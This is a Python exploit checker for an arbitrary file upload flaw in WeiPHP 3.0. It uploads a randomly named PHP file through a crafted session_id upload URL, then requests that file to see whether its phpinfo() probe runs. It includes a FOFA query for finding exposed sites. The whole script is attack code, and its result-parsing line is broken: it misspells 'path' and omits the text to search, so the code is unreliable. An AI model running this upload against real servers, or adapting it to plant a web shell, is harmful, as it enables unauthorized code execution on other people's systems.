#coding:utf-8
import requests
import requests.packages.urllib3
requests.packages.urllib3.disable_warnings()
import re
def msg():
  ret = {

      'links'     :  'https://peiqi.wgpsec.org/wiki/cms/WeiPHP/WeiPHP3.0 session_id 任意文件上传漏洞.html',

      'huixian'   :  '',

      'method'    :   'post',

      'bugname'   :   'WeiPHP3.0 session_id 任意文件上传',

      'level'     :   'high',

      'FOFA'      :   'app="weiphp"',
      'FOFA'      :   '',
      'author'    :   'ppxfx',
      'ifbug'     :   False,

  }
  return ret
def randomLowercase(n):#返回特定长度的随机小写字母
  import random
  import string
  lst = []
  for j in range(n):
    lst.append(random.choice(string.ascii_lowercase))
  lowercase = ''.join(lst)
  return lowercase
def run(url,ua):
  r0 = randomLowercase(10)
  ret = msg()
  headers = {
      'User-Agent': ua,
      'Content-Type': 'multipart/form-data; boundary=------------------------e37a54d7d5380c9f',
      'Accept-Encoding': 'gzip',
      }
  target = '/index.php?s=%2FHome%2FFile%2Fupload%2Fsession_id%2Fscevs8hub3m5ogla05a421hb42.html'
  data = f'''
--------------------------e37a54d7d5380c9f
Content-Disposition: form-data; name="download"; filename="{r0}.php"
Content-Type: application/octet-stream

<?php
phpinfo();

--------------------------e37a54d7d5380c9f--
  '''
  url1 = url + target
  ret['url'] = url1
  try:
    res=requests.post(url=url1,headers=headers,data=data,timeout=5,verify=False)
    if re.search(r'name.*?key.*?md5.*?savename.*?path.*?info.*?',res.text,re.S):
      result = re.search(r'paht.*?.php')
      path = result.group(0).replace('path','').replace('"','').replace(':','').replace('"','').replace('\\/','/')
      res.close()
      url = url + path
      resp= requests.get(url=url,headers=headers,timeout=5,verify=False)
      if 'phpinfo()' in resp.text:
        ret['ifbug'] = True
        resp.close()
        return ret
      else:
        return ret
    else:
      return ret
  except:
    return ret